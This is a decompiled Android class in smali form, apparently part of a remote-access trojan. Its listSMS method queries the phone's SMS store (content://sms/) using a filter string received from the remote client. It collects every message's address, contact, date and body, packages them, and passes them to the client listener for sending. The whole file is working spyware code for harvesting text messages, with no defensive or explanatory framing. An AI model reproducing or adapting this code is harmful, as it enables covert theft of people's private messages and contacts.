.class public Lmy/app/Library/SMSLister;
.super Ljava/lang/Object;
.source "SMSLister.java"


# direct methods
.method public constructor <init>()V
    .locals 0

    .prologue
    .line 31
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method public static listSMS(Lmy/app/client/ClientListener;I[B)Z
    .locals 22
    .parameter "c"
    .parameter "channel"
    .parameter "args"

    .prologue
    .line 37
    new-instance v20, Ljava/util/ArrayList;

    invoke-direct/range {v20 .. v20}, Ljava/util/ArrayList;-><init>()V

    .line 39
    .local v20, l:Ljava/util/ArrayList;,"Ljava/util/ArrayList<LPacket/SMSPacket;>;"
    const/16 v21, 0x0

    .line 40
    .local v21, ret:Z
    new-instance v5, Ljava/lang/String;

    move-object/from16 v0, p2

    invoke-direct {v5, v0}, Ljava/lang/String;-><init>([B)V

    .line 41
    .local v5, WHERE_CONDITION:Ljava/lang/String;
    const-string v7, "date DESC"

    .line 42
    .local v7, SORT_ORDER:Ljava/lang/String;
    const/16 v2, 0x8

    new-array v4, v2, [Ljava/lang/String;

    const/4 v2, 0x0

    const-string v3, "_id"

    aput-object v3, v4, v2

    const/4 v2, 0x1

    const-string v3, "thread_id"

    aput-object v3, v4, v2

    const/4 v2, 0x2

    const-string v3, "address"

    aput-object v3, v4, v2

    const/4 v2, 0x3

    const-string v3, "person"

    aput-object v3, v4, v2

    const/4 v2, 0x4

    const-string v3, "date"

    aput-object v3, v4, v2

    const/4 v2, 0x5

    const-string v3, "read"

    aput-object v3, v4, v2

    const/4 v2, 0x6

    const-string v3, "body"

    aput-object v3, v4, v2

    const/4 v2, 0x7

    const-string v3, "type"

    aput-object v3, v4, v2

    .line 43
    .local v4, column:[Ljava/lang/String;
    const-string v18, "content://sms/"

    .line 45
    .local v18, CONTENT_URI:Ljava/lang/String;
    invoke-virtual/range {p0 .. p0}, Lmy/app/client/ClientListener;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v2

    invoke-static/range {v18 .. v18}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v3

    const/4 v6, 0x0

    invoke-virtual/range {v2 .. v7}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v19

    .line 48
    .local v19, cursor:Landroid/database/Cursor;
    invoke-interface/range {v19 .. v19}, Landroid/database/Cursor;->getCount()I

    move-result v2

    if-eqz v2, :cond_2

    .line 49
    invoke-interface/range {v19 .. v19}, Landroid/database/Cursor;->moveToFirst()Z

    .line 52
    :cond_0
    invoke-interface/range {v19 .. v19}, Landroid/database/Cursor;->getColumnCount()I

    move-result v2

    if-eqz v2, :cond_1

    .line 53
    const-string v2, "_id"

    move-object/from16 v0, v19

    invoke-interface {v0, v2}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v2

    move-object/from16 v0, v19

    invoke-interface {v0, v2}, Landroid/database/Cursor;->getInt(I)I

    move-result v9

    .line 54
    .local v9, id:I
    const-string v2, "thread_id"

    move-object/from16 v0, v19

    invoke-interface {v0, v2}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v2

    move-object/from16 v0, v19

    invoke-interface {v0, v2}, Landroid/database/Cursor;->getInt(I)I

    move-result v10

    .line 55
    .local v10, thid:I
    const-string v2, "address"

    move-object/from16 v0, v19

    invoke-interface {v0, v2}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v2

    move-object/from16 v0, v19

    invoke-interface {v0, v2}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v11

    .line 56
    .local v11, add:Ljava/lang/String;
    const-string v2, "person"

    move-object/from16 v0, v19

    invoke-interface {v0, v2}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v2

    move-object/from16 v0, v19

    invoke-interface {v0, v2}, Landroid/database/Cursor;->getInt(I)I

    move-result v12

    .line 57
    .local v12, person:I
    const-string v2, "date"

    move-object/from16 v0, v19

    invoke-interface {v0, v2}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v2

    move-object/from16 v0, v19

    invoke-interface {v0, v2}, Landroid/database/Cursor;->getLong(I)J

    move-result-wide v13

    .line 58
    .local v13, date:J
    const-string v2, "read"

    move-object/from16 v0, v19

    invoke-interface {v0, v2}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v2

    move-object/from16 v0, v19

    invoke-interface {v0, v2}, Landroid/database/Cursor;->getInt(I)I

    move-result v15

    .line 59
    .local v15, read:I
    const-string v2, "body"

    move-object/from16 v0, v19

    invoke-interface {v0, v2}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v2

    move-object/from16 v0, v19

    invoke-interface {v0, v2}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v16

    .line 60
    .local v16, body:Ljava/lang/String;
    const-string v2, "type"

    move-object/from16 v0, v19

    invoke-interface {v0, v2}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v2

    move-object/from16 v0, v19

    invoke-interface {v0, v2}, Landroid/database/Cursor;->getInt(I)I

    move-result v17

    .line 61
    .local v17, type:I
    new-instance v8, LPacket/SMSPacket;

    invoke-direct/range {v8 .. v17}, LPacket/SMSPacket;-><init>(IILjava/lang/String;IJILjava/lang/String;I)V

    move-object/from16 v0, v20

    invoke-virtual {v0, v8}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    .line 63
    .end local v9           #id:I
    .end local v10           #thid:I
    .end local v11           #add:Ljava/lang/String;
    .end local v12           #person:I
    .end local v13           #date:J
    .end local v15           #read:I
    .end local v16           #body:Ljava/lang/String;
    .end local v17           #type:I
    :cond_1
    invoke-interface/range {v19 .. v19}, Landroid/database/Cursor;->moveToNext()Z

    move-result v2

    .line 51
    if-nez v2, :cond_0

    .line 64
    const/16 v21, 0x1

    .line 70
    :goto_0
    new-instance v2, LPacket/SMSTreePacket;

    move-object/from16 v0, v20

    invoke-direct {v2, v0}, LPacket/SMSTreePacket;-><init>(Ljava/util/ArrayList;)V

    invoke-virtual {v2}, LPacket/SMSTreePacket;->build()[B

    move-result-object v2

    move-object/from16 v0, p0

    move/from16 v1, p1

    invoke-virtual {v0, v1, v2}, Lmy/app/client/ClientListener;->handleData(I[B)V

    .line 71
    return v21

    .line 67
    :cond_2
    const/16 v21, 0x0

    goto :goto_0
.end method
